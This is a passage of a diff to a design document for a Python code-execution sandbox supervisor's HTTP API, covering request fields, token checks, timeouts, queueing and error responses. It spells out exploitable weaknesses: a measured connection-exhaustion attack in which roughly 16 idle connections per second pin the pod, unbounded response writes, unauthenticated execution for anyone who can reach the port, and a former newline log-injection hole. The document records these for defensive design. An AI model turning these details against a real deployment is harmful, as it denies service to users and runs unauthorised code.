-type, whether it is required, and what happens when it is absent or malformed; a field not
-listed here does not exist.
+pip-installs only the SDK's import closure and `prune_venv.py` deletes the rest, so
+chat-backend's client and the supervisor cannot import one definition of the wire shape. Two
+implementers building against different assumptions is not recoverable by fixing one side.
+**A field not listed here does not exist**, and unknown top-level fields are rejected `400`
+rather than ignored.
 
-**Why it lives in section 2 rather than section 4.** Every value on this wire is a
-section-2 row's wire form — the 60s/120s wall clock, the 64 KiB output cap, concurrency 1
-with a queue, `/scratch/<execution-id>` and its quotas, and the artifact manifest. The
-tokens the body carries are section 4's decision and are **not** re-opened here; this
-subsection says only how they travel and what the supervisor does with a set that does not
-hang together.
+**It must not depend on Kubernetes.** The same image runs in a plain container for development
+and the contract is identical. Nothing in the request or response may carry a downward-API
+field, a service account, a ClusterIP or a cluster DNS name, and the client holds exactly one
+configuration value — a base URL. What genuinely differs is deployment-only: the runtime class
+and node pool, the NetworkPolicy, `hostAliases` versus whatever the dev container resolves, and
+`/scratch` as an `emptyDir` versus a container-local directory.
 
-**It must not depend on Kubernetes.** A local Docker backend is coming (`4h6.40`): the same
-image runs in a plain container for development, and **the contract is identical in both**.
-Nothing in the request or the response may carry a downward-API field, a service account, a
-ClusterIP or a cluster DNS name, and the client holds exactly one configuration value — a
-base URL. What genuinely differs is deployment-only and is listed here so that nobody adds a
-wire field to compensate for it: `runtimeClassName: gvisor` and the node pool; the egress
-NetworkPolicy; `hostAliases` versus whatever the dev container resolves `db-api` and
-`results-api` with; and `/scratch` as an `emptyDir` versus a container-local directory. A
-supervisor that reads any of those to answer a request is wrong in one of the two
-deployments.
+**Transport.** Plain HTTP/1.1 on `0.0.0.0:8080`; bodies are JSON, and the supervisor parses
+`Content-Type` as a media type and ignores its parameters. Exactly three routes exist —
+`GET /health`, `POST /execute`, `GET /artifact` — any other path is `404` and any other method
+on these three is `405`. **There is no HTTP-layer authentication on `/execute`, and that is a
+decision.** The pod holds no credential it could verify a caller against, and giving it one
+would put a static secret in the single workload that runs attacker-influenceable code by
+design. The network is the authentication: the ingress allow-list is load-bearing, and a dev
+container must not publish the port. Everything travels in the JSON body and nothing in a
+header — headers are what proxies log.
 
-#### Transport
+**`GET /health`** answers `{"status", "busy", "queued"}` with `status` one of `ok`, `starting`,
+`draining`, `forkserver-down`; `200` for the first and `503` for the rest. `queued` counts
+requests *waiting* and does not count the one executing — the same definition the queue bound
+uses, so a client cannot end up predicting the wrong `429`. It is the one route exempt from the
+uniform error shape, deliberately: the probe reads only the status code, and a client polling
+for recovery wants `busy`/`queued` in the 503 too. **A busy supervisor is healthy** — reporting
+`503` under load would drop the pod out of the Service endpoints mid-execution, and with one
+replica every retry then fails against no endpoint at all.
 
-Plain HTTP/1.1 on `0.0.0.0:8080` — the container port `k8s/deployments/sandbox.yaml`
-declares and the Service maps 8080 → 8080. No TLS: on the cluster the hop is pod-to-pod and
-the ingress allow-list (section 3) is the control; in the local container the equivalent is
-binding to loopback and not publishing the port. Request and response bodies are
-`application/json; charset=utf-8`. **The supervisor parses the request's `Content-Type` as a
-media type and ignores its parameters**, so a bare `application/json` — which is what
-`4h6.47` sends — is accepted exactly as the charset form is; the `415` row below means the
-*media type* is not `application/json`. Stated because this paragraph and that row phrase it
-differently, and a supervisor doing an exact string compare against the charset form would
-`415` every request the client makes. Exactly three routes exist — `GET /health`,
-`POST /execute` and `GET /artifact` — and there is no fourth; any other path is `404`, any
-other method on these three is `405`. `GET /artifact` is the only one whose input is a query
-string rather than a body, because it carries no secret (see its subsection below).
-
-**There is no HTTP-layer authentication on `/execute`, and that is a decision rather than an
-omission.** The sandbox pod holds no credential it could verify a caller against, and giving
-it one would put a static secret in the single workload that runs attacker-influenceable
-code by design — the thing section 4 exists to prevent. The network is the authentication,
-in both deployments. Consequence, stated so it is not discovered later: anything that can
-reach port 8080 can execute code with whatever tokens it supplies, so the ingress allow-list
-is load-bearing and a dev container must not publish the port.
-
-**Everything travels in the JSON body; nothing travels in a header.** No `Authorization`, no
-`X-Execution-Id`. Headers are what proxies log, the tokens must never be logged, and a split
-between headers and body gives two places for the same value to disagree.
-
-#### `GET /health`
-
-No authentication, no request body, no query parameters. The `readinessProbe` in
-`k8s/deployments/sandbox.yaml` points here and reads only the status code.
-
-- `200` with `{"status": "ok", "busy": <bool>, "queued": <int>}` once the supervisor is
-  serving — meaning after its startup assertions have passed (`/etc/nsswitch.conf` ordering,
-  `prewarm()`; see the `4h6.39` scope and the handoff table). `busy` and `queued` are
-  informational only. **`queued` counts requests *waiting*, and does not count the one
-  executing** — the same definition the queue bound below uses, so `busy: true, queued: 0`
-  means one running and nothing behind it. Reporting a different number here from the one
-  the bound is enforced against is how a client ends up predicting the wrong `429`.
-- `503` with the same body shape before that point and while draining after `SIGTERM`, with
-  `status` holding `"starting"` in the first case and `"draining"` in the second.
-- `503` with `status: "forkserver-down"` once the fork server process is gone or its control
-  socket has been poisoned (see "A dead fork server is a dead pod" below). `status` takes
-  exactly those four values.
-- **`/health` is the one route exempt from the uniform error shape below**, and the exemption
-  is deliberate rather than an oversight: the probe reads only the status code, and a client
-  polling for recovery wants `busy`/`queued` in the 503 as much as in the 200. Stated
-  explicitly because the rule in "Error responses" is otherwise absolute, and a client that
-  parsed a `/health` 503 as `{execution_id, error}` would `KeyError` on every startup.
-- **A busy supervisor is healthy.** `/health` returns `200` while an execution is in flight.
-  Reporting `503` there would remove the pod from the Service endpoints mid-execution, which
-  with one replica means the client's own in-flight request is the last one that works and
-  every retry fails against no endpoint at all. Readiness must not flap on load.
-- The body discloses no execution id, no user, no session and no counts attributable to
-  anyone. `queued` is a depth, not an inventory.
-
-#### `POST /execute` — request
-
-One JSON object. **Unknown top-level fields are rejected with `400`** rather than ignored,
-so a field added on one side and not the other fails loudly on the first call instead of
-being silently dropped — which is the exact failure this whole subsection exists to prevent.
-The request body is capped at **1 MiB** total (`413` above it), measured on the **raw bytes
-on the wire**, and the supervisor stops reading at the cap rather than buffering past it.
-
-**The request also has time bounds, and there are three of them because a stalled head, a
-stalled body and an idle connection are different reads.** A size cap alone does not bound a slow client, and with
-concurrency 1 a request dribbling its bytes holds the supervisor's only slot for as long as it
-likes — the size cap never fires because the bytes never arrive.
-
-| bound | constant | covers | on expiry |
-|---|---|---|---|
-| head | `HEAD_READ_TIMEOUT_S` = 10s | **first byte of the request line to the blank line**, as one deadline for the whole head | `408`, `error.type: "RequestTimeout"`, connection closed, nothing routed and no body read |
-| body | `BODY_READ_TIMEOUT_S` = 10s | **end of the head to the last body byte** | `408`, `error.type: "RequestTimeout"`, connection closed |
-| idle | `IDLE_READ_TIMEOUT_S` = 65s | a connection that is open and has sent **nothing** of a request — a kept-alive client between requests | connection closed, **no response written** |
-
-10s is far above any honest pod-to-pod head or 1 MiB body and far below the wall clock, so
-neither can fire on anything but a stalled or hostile peer. The idle bound is deliberately much
-longer and deliberately silent: every kept-alive client is idle between requests, the kubelet's
-readiness probe included, and a `408` written into a connection the client believes is idle is
-the response most likely to be misread as the answer to its *next* request.
-
-**Until `4h6.58` the head bound did not exist and this section said it did** — the body
-deadline was taken inside `_execute`, i.e. after the whole head had already been parsed with no
-deadline of any kind, while `BODY_READ_TIMEOUT_S`'s own comment read "request line to last
-byte". MEASURED: a connection that sent a single byte `b"P"` and then nothing was still open at
-35s, holding a daemon handler thread that nothing would ever free. A false control stated
-alongside true ones is worse than a missing one, which is why the constant, its comment and
-this table are now derived from the same three values.
-
-**These three bound DURATION, NOT COUNT, and the residual is part of the claim.** Nothing here
-caps concurrent connections or handler threads. `_Server` is a `ThreadingHTTPServer` with
-`daemon_threads = True` — one thread per accepted connection, spawned unconditionally — and
-socketserver's `request_queue_size` of 5 is the **listen backlog**, i.e. how many connections
-may wait to be accepted, not how many may be alive. MEASURED: 400 silent connections produce
-400 threads, accepted at ~530/s, at ~20.7 kB per idle connection. Memory is not the binding
-constraint; the **pod task budget** is — the kubelet's `pod_pids_limit` of 1024, the same outer
-backstop `PID_BUDGET`'s comment cites, shared by the supervisor's own threads and by every
-process the fork server needs to run an execution. So roughly **16 silent connections per
-second, sending zero bytes, pins the pod at its task budget indefinitely**, at which point
-`fork()` fails and `/execute` cannot run at all. Note the gradient that creates, because it is
-counter-intuitive: at 65s against 10s, sending ZERO bytes is ~6.5x cheaper per connection than
-sending one, so the cheapest attack is governed by `IDLE_READ_TIMEOUT_S` — not by the head
-bound `4h6.58` was about.
-
-**And one unbounded hold is not closed by any of the three: the response WRITE.**
-`self.wfile.write(body)` has no deadline, so a client that sends a well-formed request and then
-never reads the answer parks a handler thread in `write` once the socket buffer fills, for as
-long as it likes. Every *read* off the socket is bounded; the write is not, and neither is the
-number of peers doing either.
-
-**The request line and headers are bounded as one block at 64 KiB (`MAX_HEADER_BYTES`), then
-`431` with the connection closed** — a consequence of `4h6.87`'s `_HeaderBoundedReader`, which
-has to know where the head ends before it can leave the body in the kernel. What it replaced
-was `http.client`'s **per-line** 64 KiB (`_MAXLINE`), with an over-long request line answered
-`414`. The **100-header cap is not replaced and still fires**: `parse_headers` enforces
-`http.client._MAXHEADERS` on the head this reader hands it, and 150 headers were measured
-answered `431` both before and after this change. Nothing in the contract sends more than a few
-hundred bytes of head, and none of these limits was ever reachable by a well-formed caller.
+**`POST /execute` — request.**
 
 | field | type | required | absent or malformed |
 |---|---|---|---|
-| `code` | string, UTF-8 Python source, ≤ 256 KiB | yes | absent, not a string, empty or whitespace-only → `400`. Over 256 KiB → `413`. **Measured on the UTF-8 encoding of the decoded string** (`len(code.encode("utf-8"))`), not on the JSON-escaped bytes — escaping can triple the on-wire length of the same program, and the two ends must not disagree about which one the limit is. The 1 MiB body cap is the one measured on the wire. |
-| `execution_id` | string matching `\A[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}\Z` | yes | absent or non-matching → `400`. The supervisor **must not** mint one of its own. **The anchors are `\A`/`\Z` and the match is a *full* match, deliberately:** in Python `$` also matches immediately before a final newline, so the `^…$` this row used to carry accepts `"…663\n"` — which then names a directory, is exported as `SANDBOX_EXECUTION_ID` and is echoed back in the response, i.e. a log-injection primitive on the one field this table calls strict. Any implementation of this row in any language must reject a trailing newline. |
-| `tokens` | object, exactly the two keys `db-api` and `results-api`, values compact JWS strings | yes | either key missing, an extra key, or a non-string value → `400`. Never run without them. |
-| `user` | string, the authenticated end-user email | yes | absent or empty → `400`. Must equal the tokens' `sub`. |
-| `session_id` | string, the chat session id | yes | absent or empty → `400`. Must equal the tokens' `sid`. |
-| `timeout_s` | integer seconds, `1 ≤ timeout_s ≤ 120` | no, default **60** | absent → 60. Non-integer, ≤ 0, or **> 120 → `400`, not clamped** (see below). |
+| `code` | string, UTF-8 Python source | yes | absent, not a string, or blank → `400`; over the cap → `413`. Measured on the UTF-8 encoding of the decoded string, not on the JSON-escaped bytes — escaping can triple the on-wire length of the same program. |
+| `execution_id` | lowercase uuid4, `\A…\Z`, full match | yes | absent or non-matching → `400`. The supervisor must not mint one. The anchors are not fastidiousness: `$` also matches before a final newline, and this value names a directory and is echoed back. |
+| `tokens` | object, exactly `db-api` and `results-api`, compact JWS strings | yes | a missing key, an extra key or a non-string → `400`. Never run without them. |
+| `user` | authenticated end-user email | yes | absent or empty → `400`; must equal the tokens' `sub`. |
+| `session_id` | chat session id | yes | absent or empty → `400`; must equal the tokens' `sid`. |
+| `timeout_s` | integer seconds within the wall-clock bounds | no | absent → the default. Non-integer, ≤ 0, or over the ceiling → **`400`, not clamped**. |
 
-**`execution_id` is one value in three roles**, and the strict uuid4 form is not
-fastidiousness: it becomes the `/scratch/<execution-id>` directory name, so any laxer rule
-re-opens path traversal on the one request value that names a filesystem path. The three
-roles are the directory name, the `jti` of both tokens, and the join key that makes the
-`4h6.12` audit trail, db-api's `endpoint_access` lines and chat-backend's manifest record
-line up. `mint_execution_tokens` takes an optional `execution_id=` for precisely this
-(section 4, "As built"), and it **raises `SandboxTokenUnavailable`** when the signing key is
-unset — which the client must surface, never catch and continue.
+**Reject, do not clamp**, and **refuse, do not pick a winner.** Clamping is a silent behaviour
+change on a path fed from a model-influenceable direction, and it desyncs the client's own
+deadline. Likewise the supervisor decodes each token's payload *without verifying the
+signature* — it holds no signing key, deliberately and permanently — purely to check its
+caller's own consistency: the two `jti` must agree with each other and with `execution_id`,
+each `aud` with the key it was sent under, each `sub` with `user` and `sid` with `session_id`.
+A mismatch is `400`, and `exp` already past **at dequeue** is `409 TokenExpired`. Preferring
+the `jti` would name the directory one thing and stamp the audit another; preferring the body
+would hand the child credentials whose `jti` joins to no directory.
 
-**When the three roles disagree — refuse, do not pick a winner.** The supervisor decodes
-each token's payload segment **without verifying the signature** (it holds no signing key,
-deliberately, and never will) purely to read `sub`, `sid`, `jti` and `exp`. These are
-consistency checks on its own caller, **not authentication** — the security decision is
-db-api's and results-api's verification (section 4), and nothing here may be mistaken for
-it. The rules:
+`execution_id` is one value in three roles — the `/scratch` directory name, both tokens' `jti`,
+and the join key that lines up the audit records, db-api's `endpoint_access` lines and
+chat-backend's manifest record. A **repeated** id is `409 DuplicateExecutionId` whenever the
+directory exists, live or still retained: reusing it would merge two runs into a manifest
+chat-backend already recorded, and wiping would delete artifacts `read_artifact` may still be
+serving. That is a normal event rather than a client bug, which is why it has a specified
+outcome. After a `429` the client re-mints a fresh `execution_id` too, not just fresh tokens.
 
-| condition | result |
-|---|---|
-| a token is not three dot-separated segments, or its payload is not decodable JSON | `400` |
-| the two tokens' `jti` differ from each other | `400` |
-| either `jti` ≠ the body's `execution_id` | `400` |
-| a token's `aud` ≠ the key it was sent under | `400` |
-| a token's `sub` ≠ the body's `user`, or `sid` ≠ the body's `session_id` | `400` |
-| `exp` is already past **at dequeue** (see concurrency) | `409`, `error.type: "TokenExpired"` |
+**Timeout semantics.** The wall clock is measured **from the fork**, so queue wait does not
+count against the script. On expiry the supervisor signals the child's process group, kills
+after the grace, reaps, and still answers `200` with `status: "timeout"` and whatever output
+was captured.
 
-Refusing rather than preferring one value is the point. Preferring the `jti` would name the
-directory one thing and stamp the audit another; preferring the body would hand the child
-credentials whose `jti` joins to no directory. Either way every downstream record keys on a
-value some other record does not carry, and the damage is invisible until somebody asks
-"what did that script read?" and gets nothing back. A mismatch means the tokens were not
-minted for this request, and that is a caller bug worth a hard failure on the first call.
+**The client's own deadline must be `max queued wait + timeout_s + margin`**, not `timeout_s`:
+the supervisor may hold a request for the full queued wait *and then* run it for the full
+timeout. A client that sets it lower times out on an execution the supervisor is about to
+answer — and because a running child is deliberately not killed on disconnect, that client's
+retry then queues behind the child it abandoned.
 
-**The tokens travel in the body and nowhere else.** Never pod env, never a ConfigMap, never
-a Secret: chat-backend cannot set environment variables on a running pod, and a pod-spec
-value turns a 300s per-execution credential into a static pod-lifetime one. The supervisor
-places them in the forked child only — under the decided shared-uid model their protection
-is **lifetime** (the SDK reads the file once and unlinks it), not permissions. The
-supervisor must never log a token, must never echo one in a response, and must not keep one
-after the child is reaped.
+**When the client goes away.** A **queued** request whose connection has closed is dropped at
+dequeue and never forked: nobody is waiting, and running it would spend the pod's only slot and
+a credential nobody will use. A **running** child is *not* killed — it completes, is reaped,
+its manifest is written and its artifacts are retained; the undeliverable response is
+discarded. Killing it would destroy artifacts the retention window promises, and
+peer-disconnect detection while nobody is reading the socket is unreliable enough that a false
+positive would kill live executions.
 
-**The timeout is bounded and the model cannot raise it.** 60s default, 120s hard ceiling
-(section 2's Wall clock row). Two independent things enforce that: `run_analysis` exposes no
-timeout parameter to the model at all, so no model-authored value ever reaches this field;
-and the supervisor **rejects** `timeout_s > 120` with `400`. **Decision: reject, not clamp.**
-Clamping is a silent behaviour change on a path fed from a model-influenceable direction — a
-caller asking for 300 has either a bug or a jailbreak, and both deserve to be visible. It
-would also desync the two deadlines: the client sets its own deadline *above* what the
-supervisor can take (`4h6.47`; see the arithmetic under "When the client goes away"), and a
-silently clamped server-side value makes the client's arithmetic wrong.
-
-**Timeout semantics.** `timeout_s` is the child's wall clock measured **from the fork**, not
-from request receipt — queue wait does not count against the script. On expiry the
-supervisor `SIGTERM`s the child's process group, `SIGKILL`s after a 2s grace, reaps, and
-still answers `200` with `status: "timeout"` and whatever output was captured.
-`terminationGracePeriodSeconds: 130` is 120s plus reap and answer, so that sequence
-has to complete in seconds, not tens of them.
-
-#### Concurrency: one at a time, queued, with a bounded queue and a bounded wait
-
-**One execution at a time** (section 2's Concurrency row), and with `replicas: 1` and
-`strategy: Recreate` that is the cluster-wide bound. **It is not what removes cross-user
-co-tenancy inside the pod, and the sentence here used to say it was.** `4h6.55` measured the
-opposite: the queue described immediately below holds up to two *other* users' requests while
-one executes, and retention holds completed ones for five minutes, so the pod is co-tenanted
-by construction — just not simultaneously. What the fork server (`4h6.55` option (b), "As built"
-below) removes is the memory route between those tenants. Of the other two: the `/scratch`
-route is closed for **integrity** (`genetics-results-suite-4h6.82`) and, for **reading**,
-closed **between** executions and open **within** one (`genetics-results-suite-4h6.88`:
-retained artifacts are encrypted, the live window is not — see "Artifact encryption at rest"),
-and the
-escaped-process route is **bounded** across executions — a chain of `setsid()`'d processes is
-cleared `FS_SWEEP_MAX_ROUNDS` (4) levels deep per execution, and a deeper one loses four more
-levels on each subsequent execution — and open **within** one
-(`genetics-results-suite-4h6.83`). A second concurrent `POST /execute` is **queued, not refused**:
-measured peak is 23 chat turns/hour, so a collision is rare, and turning a rare collision
-into a user-visible tool failure buys nothing.
-
-The queue is bounded in **both** dimensions, and the bound is derived rather than picked:
-a queued request holds tokens that expire at `iat + 300`, so a wait long enough to outlive
-them produces a script whose every data call `401`s. **Queue depth 2 and a maximum queued
-wait of 120s**, whichever binds first; beyond either the supervisor answers `429` with
-`Retry-After: 60`. On **dequeue** — not on receipt — it re-checks `exp`, and answers `409`
-`TokenExpired` if the wait consumed the credential. That distinction matters to the client:
-`400` means "your request was wrong", `409` means "you waited too long; re-mint and retry".
-
-**Depth 2 means at most two requests *waiting*, not counting the one executing.** So three
-requests can be in flight — one running, two queued — and the fourth gets `429`. Stated
-because the other reading (two total, i.e. one running plus one waiting) is equally
-defensible and silently differs by one, and a client treating `/health`'s `queued < 2` as
-"safe to submit" would then take `429`s it did not predict. `/health`'s `queued` uses this
-same definition.
-
-**After a `429` the client re-mints, and it re-mints a fresh `execution_id` too**, not just
-fresh tokens: the refused request never reached a fork (see the duplicate-id rule below, and
-the directory is created at dequeue, so a `429` leaves nothing behind), and reusing the id
-would collide with that rule the moment the earlier attempt did run.
-
-**`409 TokenExpired` is a defensive check and is not expected to fire, and an earlier draft
-justified it wrongly.** That draft said the `429` retry was "the only route by which it is
-reachable at all", which does not follow from its own numbers: the retry re-mints, and the
-maximum queued wait (120s) is far below the 300s TTL, so a freshly minted pair cannot expire
-in the queue. What can actually reach it is a token pair that was **not** freshly minted —
-`mint_execution_tokens` takes an optional `execution_id=`, so a caller can resubmit an older
-pair — or clock skew between the minter and the supervisor large enough to matter. Both are
-caller-side faults worth a distinct status, and the check stays; a client should handle it
-without treating it as routine.
-
-**A repeated `execution_id` is refused: `409` with `error.type: "DuplicateExecutionId"`**,
-whenever `/scratch/<execution-id>` already exists — a live execution or a completed one still
-inside its 5-minute artifact retention. After retention expires the id is reusable, which is
-harmless because nothing then refers to it. This is a normal event, not a client bug, which
-is why it has a specified outcome rather than being left to the implementer: the `429` retry
-path, the 5-minute retention and `mint_execution_tokens`' optional `execution_id=` (section
-4, "As built") together make a resubmission with the same id easy to write by accident.
-Refusing is the only one of the three plausible behaviours that preserves the invariant
-everything downstream keys on — one `execution_id` names exactly one directory, one manifest
-and one audit trail. Reusing the directory would merge two runs' artifacts into a manifest
-chat-backend has already recorded, and wiping and re-running would delete artifacts
-`read_artifact` may still be serving from the first run; both leave the `jti`/`sid` join
-`4h6.52`'s sid-scoped retrieval is built on pointing at content that is not what was
-recorded.
-
-**The maximum wait — not the depth — is the number the token lifetime constrains.** The
-inequality is `max wait + timeout_s < 300`: 120 + 120 = 240 against the real 300s **token** TTL
-(section 4). Depth does not appear in it, and raising the depth lengthens the queue without
-lengthening any individual wait, because the wait bound cuts first. Anyone raising the
-**wait** above 180s is the one who breaks it, and gets a script whose data calls `401`
-mid-run. Note also that the 60s of slack this leaves is not free headroom: section 4
-justifies the 300s TTL partly by "a slow BigQuery job started at the last moment" plus clock
-skew, and an execution that waited the full 120s and then ran the full 120s has ~60s of token
-life left for that last-moment call rather than the ~180s section 4's reasoning assumes — so
-the wait bound trades directly against section 4's margin.
-
-**When the client goes away, the supervisor's behaviour depends on whether the child has
-been forked.** The contract tells the client to set its own deadline *above* **the maximum
-queued wait plus `timeout_s`**, so the ordinary case is that it waits; but chat-backend
-restarts, and a connection can drop. Two rules:
-
-**That deadline is 240s at `timeout_s: 120`, not 120s, and an earlier draft of this
-subsection said "above the 120s ceiling" twice.** It was wrong in the direction that
-produces a live interop bug, which is why it is called out rather than quietly fixed: the
-supervisor may hold a request for the full 120s queued wait **and then** run it for the full
-`timeout_s`, so a client that read that sentence literally and picked, say, 150s times out
-on an execution the supervisor is about to answer — and because a running child is
-deliberately not killed on disconnect, that client's retry then queues behind the child it
-abandoned. `4h6.47` implemented `max queued wait + timeout_s + margin` (255s at
-`timeout_s: 120`), which is the correct reading.
-
-- **A queued request whose connection has closed is dropped at dequeue and never forked.**
-  Nobody is waiting for the response, and running it would spend the pod's only slot and up
-  to 120s of a credential nobody will use — while the client's retry queues behind it. The
-  check is cheap and is made at dequeue, where the `exp` re-check already happens.
-- **A running child is *not* killed on disconnect. It runs to completion**, is reaped, its
-  manifest is written and its artifacts are retained for the usual 5 minutes; the response
-  it can no longer deliver is discarded. Killing it would destroy artifacts the retention
-  window promises and that a rerun may not reproduce, and peer-disconnect detection while
-  the supervisor is not reading the socket is unreliable enough that a false positive would
-  kill live executions. The slot is held for at most `timeout_s`, i.e. ≤ 120s, which is the
-  same bound the queue's max wait is derived against — an abandoned child cannot starve the
-  queue for longer than a healthy one.
-
-A chat-backend restart mid-execution is exactly this case and needs no separate handling: the
-old response is undeliverable, the artifacts survive their retention window, and the retry
-arrives with a **fresh** `execution_id` (per the duplicate rule above) and queues normally. A
-`SIGTERM` to the *supervisor* is the other direction and is already specified: it stops
-accepting (`503 NotReady`) and lets the in-flight child finish inside the 130s grace — **and
-it also waits for that execution's response to be written**, which is a separate step and was
-not always taken; see "The drain waits for the answer" below.
-
-#### `POST /execute` — response
-
-**It does not stream. One request, one response, returned once, after the child has been
-reaped.** Stated plainly because "stream stdout" (`4h6.42`) refers to the supervisor reading the child's pipe incrementally — which it must, to enforce
-the 8 MiB pipe cap — not to a streaming HTTP response. Three reasons the response cannot
-stream: the 64 KiB head-and-tail cap is uncomputable until the stream ends, because the tail
-is unknown until then; the artifact manifest and the error object are only knowable at the
-end, so a streaming body would put them after an unbounded prefix that every client must
-buffer anyway; and the model consumes the whole result in one turn regardless.
-
-**`200` means the supervisor ran the script and is reporting what happened — including a
-script that raised, timed out or was killed.** A failing script is not an HTTP failure.
-Non-2xx is reserved for the supervisor refusing or being unable to run it at all.
+**`POST /execute` — response.** It does not stream: one request, one response, after the child
+has been reaped. `200` means the supervisor ran the script and is reporting what happened,
+**including a script that raised, timed out or was killed** — non-2xx is reserved for the
+supervisor refusing or being unable to run it at all.
 
 | field | type | notes |
 |---|---|---|
 | `execution_id` | string | echo of the request value |
-| `status` | `"ok"` \| `"error"` \| `"timeout"` \| `"limit"` | `ok` = child exited 0; `error` = non-zero exit or an uncaught exception; `timeout` = wall clock fired; `limit` = a supervisor-enforced limit fired |
-| `exit_code` | integer or `null` | `null` when the child was killed by a signal or never started |
-| `signal` | integer or `null` | `null` when it exited normally. Kept separate from `exit_code` rather than folded into `128+n`, which loses which of the two happened |
+| `status` | `"ok"` \| `"error"` \| `"timeout"` \| `"limit"` | `ok` = exited 0; `error` = non-zero exit or uncaught exception; `timeout` = wall clock; `limit` = a supervisor limit fired |
+| `exit_code` / `signal` | integer or `null` | kept separate rather than folded into `128+n`, which loses which of the two happened |
 | `duration_ms` | integer | child wall clock, fork to reap; excludes queue wait |
-| `output` | string, always present, `""` if none | see below |
-| `output_bytes` | integer | total bytes read from the child's pipe before capping, up to the 8 MiB pipe cap |
-| `output_truncated` | boolean | true iff `output` is elided or the pipe cap fired |
-| `error` | object or `null` | present iff `status != "ok"`; see below |
-| `artifacts` | array of objects, always present, `[]` if none | the manifest; see below |
-| `artifacts_omitted` | integer ≥ 0 | files present in the artifacts directory that could not be listed retrievably; see below |
-| `artifacts_retained_in_clear` | boolean | true iff the seal pass could **neither encrypt nor delete** what the script wrote, so those bytes stay readable at the shared uid until the reaper removes the directory (`4h6.88`); false on every other outcome, including a plain failure that ended in deletion. Always present. Deliberately **not** folded into `artifacts_omitted`, which means "produced, present, not listed" and cannot distinguish "destroyed everything" from "destroyed nothing" |
-
-The response carries **no token, no filesystem path, no environment and no host name**.
-
-**`output` is stdout and stderr interleaved, as the child wrote them.** Section 2 budgets
-**one** 64 KiB window (first 32 KiB + last 32 KiB) for what reaches the model, and the
-traceback the model needs is at the tail. Splitting that budget across two fields either
-halves the head-and-tail window or quietly doubles section 2's number, so the child gets one
-pipe and this contract returns one string. The SDK's audit records are **not** in it — they
-go to the dedicated fd described below. Naming the field `output` rather than `stdout` is
-deliberate: a field called `stdout` that also carries stderr is a trap for whoever reads
-this document next.
-
-**Capping and elision.** Capping is applied to **bytes**, head 32 KiB + tail 32 KiB, with the
-literal marker `\n...[<N> bytes elided]...\n` between them, where `<N>` is the decimal count
-of bytes dropped. The marker is fixed text so a client can recognise it without heuristics.
-The 64 KiB budget is the head and the tail **only — the marker is additional**, so a fully
-elided `output` encodes to 65536 bytes plus the marker's ~30. Head and tail are exactly
-32 KiB each rather than 32 KiB minus half a marker, because the alternative makes the two
-ends' arithmetic depend on the decimal width of `<N>`.
-
-**The 8 MiB pipe cap kills the child, and it is a `limit`, not an `ok`.** Section 2's Output
-cap row says the reader stops at 8 MiB from the pipe *and kills the child*; this is what that
-looks like on the wire, stated because a supervisor that instead drained and discarded the
-excess would answer `200 status:"ok" error:null` and silently violate section 2 — the whole
-point of the cap is that the supervisor's memory and the pod's CPU stop being consumed, which
-draining does not achieve. On the cap firing the supervisor `SIGTERM`s the child's process
-group, `SIGKILL`s after the same 2s grace as the timeout path, reaps, and answers **`200`**
-with `status: "limit"`, `error.type: "OutputLimit"`, `error.limit: "OutputLimit"` and
-`output_truncated: true`. `exit_code` and `signal` report how the child actually ended —
-normally `exit_code: null` with `signal` 15 or 9 depending on whether the grace expired, but
-a child that traps `SIGTERM` and exits reports its `exit_code` with `signal: null` instead.
-`status` is `"limit"` in every one of those cases: it records that the supervisor's limit
-fired, not how the process happened to die.
-
-**Output that is not valid UTF-8 is decoded lossily, and there is no alternate encoding.**
-The head/tail split cuts on byte boundaries and can bisect a multi-byte sequence, and a
-script can print arbitrary bytes in any case. The supervisor decodes with
-`errors="replace"`, so invalid bytes become U+FFFD and `output` is always a valid JSON
-string. **No base64, no `encoding` field**, because a client that has to branch on encoding
-will eventually get the branch wrong, and the model cannot read base64 usefully anyway. A
-script with binary to return writes an **artifact**; `read_artifact` already returns base64
-with an explicit `encoding` field for exactly that case (section 6).
-
-**The `error` object.**
-
-| field | type | notes |
-|---|---|---|
-| `type` | string, **open** | the child's exception class name (`ValueError`), or one of the supervisor's own reserved names: `Timeout`, `PidLimit`, `ArtifactQuota`, `ScratchQuota`, `OutputLimit`, `NonZeroExit`, `Killed`, `StartupFailure` |
-| `message` | string, ≤ 2 KiB | truncated, never omitted |
-| `traceback` | string or `null`, tail-capped at 8 KiB | `null` when the end was not an exception |
-| `limit` | string or `null` | which limit fired, when `status == "limit"`; the same vocabulary as `type` |
-
-**`type` is an open string, and the listed names are a reserved minimum.** It cannot be a
-closed enum, because half its range is the child's exception class name and the child imports
-whatever it likes. So: the supervisor's own names above are reserved — it emits no others for
-those conditions and a client may branch on them — and every other value is an opaque label
-to display, never to switch on. This is the one place the subsection's "a field not listed
-here does not exist" rule does not extend to values: it constrains the set of *fields*, not
-the set of strings a `type` may hold.
-
-**Memory exhaustion has no reserved name, and `MemoryLimit` is not one of the eight above.**
-The name exists in `sandbox/supervisor.py` as `ERR_MEMORY_LIMIT` and an earlier version of this
-table listed it, but nothing has ever emitted it and nothing can: the memory ceiling is
-`RLIMIT_AS`, which the **child** applies to itself and the kernel enforces inside the child, so
-the supervisor never sees a limit fire. What comes back is the child's own exception class —
-`status: "error"`, `error.type: "MemoryError"`, `error.limit: null` — on the *open* half of the
-range, which is what a client must match. The supervisor cannot re-label it: doing so would
-mean trusting the child to tell the ceiling apart from a plain `raise MemoryError`, and
-refusing exactly that trust is what the reserved set is for. `ERR_MEMORY_LIMIT` therefore stays
-in the supervisor's reserved set — where its only remaining job is to stop a script forging the
-name — and is deliberately absent from both `_LIMIT_MESSAGES` and this table. A client branch
-keyed on `"MemoryLimit"` is dead code; `genetics-mcp-server`'s `_analysis_hint` has one, and it
-is doubly unreachable because it sits under `status == "limit"`, which a `MemoryError` never
-produces.
-
-**`NonZeroExit` is the name for a child that exited non-zero without an uncaught exception**
-— `sys.exit(3)`, a C extension calling `exit()`, a subprocess convention. The `status` table
-already makes that a `status: "error"` case, and without a reserved name for it every
-supervisor would invent its own (`ExitCode`, `Error`, the number itself). `exit_code` carries
-the number; `traceback` is `null`.
-
-**Unsettled, and deliberately not invented here:** *how* the child reports its exception type
-and traceback to the supervisor — a structured final record on a dedicated fd, versus the
-supervisor parsing the tail of `output` — is `4h6.39`'s to settle. This contract fixes only
-the shape the supervisor emits. A supervisor that can only observe an exit status and a byte
-stream may legitimately report `type: "Killed"` with `traceback: null`; a client must
